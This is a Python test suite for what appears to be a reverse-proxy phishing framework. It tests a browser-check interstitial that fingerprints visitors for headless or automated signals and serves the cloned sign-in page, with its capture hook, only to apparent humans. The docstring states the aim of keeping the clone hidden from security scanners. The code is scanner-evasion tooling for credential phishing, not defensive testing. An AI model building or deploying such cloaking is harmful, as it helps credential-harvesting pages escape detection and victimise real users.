"""Pre-serve human challenge: the clone is not handed over on the first hit.

The measured gap (docs/DELIVERY_AND_HYGIENE_PLAN.md item 1): the pre-serve decision
was JA3 + User-Agent only, and the device signals that expose a headless browser arrive
AFTER the page has been served, so a scanner with a clean UA got the clone on hit #1.
These tests drive the real proxy: the first hit must be the interstitial, a pass must
issue a token, and only a request carrying that token may see the page.
"""
import http.client
import json
import os
import re
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import capture as cap  # noqa: E402
from core.challenge import (  # noqa: E402
    HEADLESS_REASONS,
    VERIFY_PATH,
    Challenge,
    score_signals,
)
from core.proxy import HOOK_PATH, Phishlet, ProxyEngine, serve_proxy  # noqa: E402

pytestmark = pytest.mark.integration

HUMAN = {
    "webdriver": False,
    "languages": ["en-US", "en"],
    "timezone": "Asia/Kolkata",
    "offset": -330,
    "plugins": 5,
    "hardware": 8,
    "touch": False,
    "gl_renderer": "ANGLE (Intel, Intel(R) UHD Graphics Direct3D11)",
    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
    "interactions": 12,
    "fractional": 9,
    "dwell_ms": 2500,
}

HEADLESS = {
    "webdriver": True,
    "languages": [],
    "timezone": "",
    "plugins": 0,
    "gl_renderer": "SwiftShader",
    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
    "interactions": 0,
}


def free_port():
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


# ================================================================== unit =======
class TestTheToken:

    def test_a_token_is_bound_to_its_session_and_expires(self):
        ch = Challenge(secret=b"k" * 32, ttl=900)
        tok = ch.issue("sid-a", now=1000)
        assert ch.verify(tok, "sid-a", now=1000) is True
        assert ch.verify(tok, "sid-b", now=1000) is False, "another session's token"
        assert ch.verify(tok, "sid-a", now=1000 + 901) is False, "past its ttl"
        assert ch.verify(tok, "sid-a", now=999) is False, "issued in the future"

    def test_tampering_and_junk_are_refused(self):
        ch = Challenge(secret=b"k" * 32)
        tok = ch.issue("sid-a")
        assert ch.verify(tok[:-2] + "aa", "sid-a") is False
        assert ch.verify("", "sid-a") is False
        assert ch.verify("not-base64!!", "sid-a") is False
        assert ch.verify(tok, "") is False

    def test_a_token_from_another_secret_is_refused(self):
        a = Challenge(secret=b"a" * 32)
        b = Challenge(secret=b"b" * 32)
        assert b.verify(a.issue("sid"), "sid") is False


class TestTheScoring:

    def test_a_human_passes_with_no_reasons(self):
        ok, score, reasons = score_signals(HUMAN)
        assert ok and score == 100 and reasons == []

    def test_no_interaction_is_disqualifying(self):
        """The point of the challenge: a script that runs but never interacts fails."""
        ok, score, reasons = score_signals({**HUMAN, "interactions": 0})
        assert ok is False
        assert HEADLESS_REASONS["no_interaction"] in reasons, reasons

    def test_webdriver_is_disqualifying(self):
        ok, _score, reasons = score_signals({**HUMAN, "webdriver": True})
        assert ok is False and any("webdriver" in r for r in reasons)

    def test_a_software_renderer_costs_but_does_not_condemn(self):
        ok, score, reasons = score_signals({**HUMAN, "gl_renderer": "llvmpipe (LLVM)"})
        assert ok is True and score == 75
        assert any("renderer" in r for r in reasons)

    def test_several_soft_tells_together_fail(self):
        ok, score, _reasons = score_signals({
            **HUMAN, "languages": [], "timezone": "", "plugins": 0,
            "gl_renderer": "SwiftShader"})
        assert ok is False and score < 60

    def test_a_mobile_without_touch_is_only_a_soft_tell(self):
        ok, score, reasons = score_signals({
            **HUMAN, "plugins": 0, "touch": False,
            "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148"})
        assert ok is True and score == 85
        assert any("touch" in r for r in reasons)

    def test_interaction_can_be_waived(self):
        ok, _score, _r = score_signals({**HUMAN, "interactions": 0},
                                       require_interaction=False)
        assert ok is True

    def test_junk_input_does_not_crash(self):
        """Junk is not a human: the decision is a refusal with a bounded score."""
        for junk in (None, [], "x", {}, {"interactions": "abc"}):
            ok, score, _r = score_signals(junk)
            assert ok is False, junk
            assert isinstance(score, int) and 0 <= score <= 100, (junk, score)


class TestTheInterstitial:

    def test_it_carries_the_verify_and_next_urls_and_nothing_else(self):
        ch = Challenge(brand="")
        page = ch.page("https://camp.test/login", verify_url=VERIFY_PATH)
        assert VERIFY_PATH in page
        assert '"https://camp.test/login"' in page
        assert "Checking your browser" in page
        # nothing to grep: no hook, no collector, no brand, no login form
        for marker in ("__bh/hook", "__bh/intel", "__bh/capture", "password",
                       "<form", "data-capture"):
            assert marker not in page, marker
        # and the tells it reads are the ones the scoring understands
        for probe in ("navigator.webdriver", "getTimezoneOffset", "UNMASKED_RENDERER",
                      "pointermove", "interactions"):
            assert probe in page, probe

    def test_the_brand_is_escaped(self):
        page = Challenge(brand="<script>alert(1)</script>").page("/x")
        assert "<script>alert(1)</script>" not in page
        assert "&lt;script&gt;" in page


# =========================================================== the real proxy ====
class TestTheProxyChallenge:

    @staticmethod
    def _upstream():
        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                b = (b"<html><head><title>Sign in</title></head><body>"
                     b"<h1>Sign in</h1><form><input name=password></form>"
                     b"</body></html>")
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(b)))
                self.end_headers()
                self.wfile.write(b)

        httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        return httpd

    def _serve(self, challenge):
        up = self._upstream()
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bp_ch_"), "c.db"))
        ph = Phishlet(name="ch", upstream=f"127.0.0.1:{up.server_address[1]}",
                      scheme="http")
        engine = ProxyEngine(ph, db=db, geo_provider="off", logger=lambda *a: None)
        engine.challenge = challenge
        port = free_port()
        httpd = serve_proxy(engine, port, campaign="ch")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.25)
        return up, db, httpd, port, up.server_address[1]

    @staticmethod
    def _req(port, path, host, method="GET", body=None, cookie="",
             accept="text/html,application/xhtml+xml"):
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
        h = {"Host": host, "Accept": accept}
        if cookie:
            h["Cookie"] = cookie
        raw = json.dumps(body).encode() if body is not None else None
        if raw is not None:
            h["Content-Type"] = "application/json"
        conn.request(method, path, body=raw, headers=h)
        r = conn.getresponse()
        data = r.read()
        headers = dict(r.getheaders())
        status = r.status
        conn.close()
        return status, data.decode("utf-8", "replace"), headers

    def test_the_first_hit_is_the_challenge_not_the_clone(self):
        up, db, httpd, port, uport = self._serve(Challenge())
        try:
            st, body, headers = self._req(port, "/login", f"127.0.0.1:{uport}")
            assert st == 200
            assert "Checking your browser" in body
            assert "<form" not in body and "Sign in</h1>" not in body, \
                "the clone was served before the challenge"
            assert HOOK_PATH not in body and "/__bh/intel" not in body, \
                "the challenge page must carry no hook or collector"
            assert VERIFY_PATH in body
            assert "__bhs=" in headers.get("Set-Cookie", "")
        finally:
            httpd.shutdown()
            httpd.server_close()
            db.close()
            up.shutdown()

    def test_a_pass_issues_a_token_and_then_the_clone_is_served(self):
        ch = Challenge()
        up, db, httpd, port, uport = self._serve(ch)
        try:
            # 1) the first hit: interstitial + the session cookie a browser would keep
            st, body, headers = self._req(port, "/login", f"127.0.0.1:{uport}")
            assert "Checking your browser" in body
            sid_cookie = headers.get("Set-Cookie", "").split(";")[0]
            assert sid_cookie.startswith("__bhs="), sid_cookie
            # 2) the challenge script reports back, carrying that session
            st, body, vheaders = self._req(port, "/__bh/verify", f"127.0.0.1:{uport}",
                                           method="POST", body=HUMAN,
                                           cookie=sid_cookie)
            assert st == 200 and json.loads(body)["ok"] is True
            token = re.search(r"([A-Za-z0-9_]+v)=([A-Za-z0-9_\-=]+)",
                              vheaders.get("Set-Cookie", ""))
            assert token, vheaders.get("Set-Cookie")
            # 3) the follow-up navigation carries both cookies, as a browser would
            st, body, _h = self._req(
                port, "/login", f"127.0.0.1:{uport}",
                cookie=f"{sid_cookie}; {token.group(1)}={token.group(2)}")
            assert st == 200
            assert "Sign in</h1>" in body, "the clone was not served after a pass"
            assert HOOK_PATH in body, "the verified page must carry the hook"
        finally:
            httpd.shutdown()
            httpd.server_close()
            db.close()
            up.shutdown()

    def test_the_token_does_not_work_for_another_session(self):
        """The token is bound to the session that passed: a token lifted from one
        visitor's browser is worthless in another's."""
        ch = Challenge()
        up, db, httpd, port, uport = self._serve(ch)
        try:
            _st, _b, headers = self._req(port, "/login", f"127.0.0.1:{uport}")
            sid_a = headers.get("Set-Cookie", "").split(";")[0]
            _st, _b, vheaders = self._req(port, "/__bh/verify", f"127.0.0.1:{uport}",
                                          method="POST", body=HUMAN, cookie=sid_a)
            token = re.search(r"([A-Za-z0-9_]+v)=([A-Za-z0-9_\-=]+)",
                              vheaders.get("Set-Cookie", ""))
            assert token, vheaders.get("Set-Cookie")
            # a different visitor presents that token with its own session
            _st, _b, other = self._req(port, "/login", f"127.0.0.1:{uport}",
                                       accept="text/html",
                                       cookie="__bhs=" + "f" * 32)
            st, body, _h = self._req(
                port, "/login", f"127.0.0.1:{uport}",
                cookie=f"__bhs={'f' * 32}; {token.group(1)}={token.group(2)}")
            assert st == 200 and "Checking your browser" in body, \
                "another session's token was accepted"
        finally:
            httpd.shutdown()
            httpd.server_close()
            db.close()
            up.shutdown()

    def test_a_headless_report_is_refused_and_the_clone_stays_hidden(self):
        ch = Challenge()
        up, db, httpd, port, uport = self._serve(ch)
        try:
            st, body, headers = self._req(port, "/__bh/verify", f"127.0.0.1:{uport}",
                                          method="POST", body=HEADLESS)
            assert st == 200
            res = json.loads(body)
            assert res["ok"] is False and res["reasons"], res
            assert "Set-Cookie" not in headers, "a refusal must not issue a token"
            st, body, _h = self._req(port, "/login", f"127.0.0.1:{uport}")
            assert "Checking your browser" in body
            assert "Sign in</h1>" not in body
            assert len(ch.refusals) == 1, "the refusal was not recorded"
        finally:
            httpd.shutdown()
            httpd.server_close()
            db.close()
            up.shutdown()

    def test_a_forged_token_does_not_get_through(self):
        up, db, httpd, port, uport = self._serve(Challenge())
        try:
            forged = "A" * 40
            st, body, _h = self._req(port, "/login", f"127.0.0.1:{uport}",
                                     cookie=f"__bhsv={forged}")
            assert st == 200 and "Checking your browser" in body
        finally:
            httpd.shutdown()
            httpd.server_close()
            db.close()
            up.shutdown()

    def test_assets_and_the_verify_route_are_never_challenged(self):
        up, db, httpd, port, uport = self._serve(Challenge())
        try:
            # a non-HTML request (an asset fetch) passes straight through
            st, body, _h = self._req(port, "/static/app.js", f"127.0.0.1:{uport}",
                                     accept="application/javascript")
            assert "Checking your browser" not in body
            # and the hook itself is servable, or the challenge could never be passed
            st, body, _h = self._req(port, HOOK_PATH, f"127.0.0.1:{uport}",
                                     accept="application/javascript")
            assert st == 200 and "sendBeacon" in body
        finally:
            httpd.shutdown()
            httpd.server_close()
            db.close()
            up.shutdown()

    def test_without_the_flag_nothing_changes(self):
        up, db, httpd, port, uport = self._serve(None)
        try:
            st, body, _h = self._req(port, "/login", f"127.0.0.1:{uport}")
            assert st == 200
            assert "Sign in</h1>" in body and "Checking your browser" not in body
        finally:
            httpd.shutdown()
            httpd.server_close()
            db.close()
            up.shutdown()
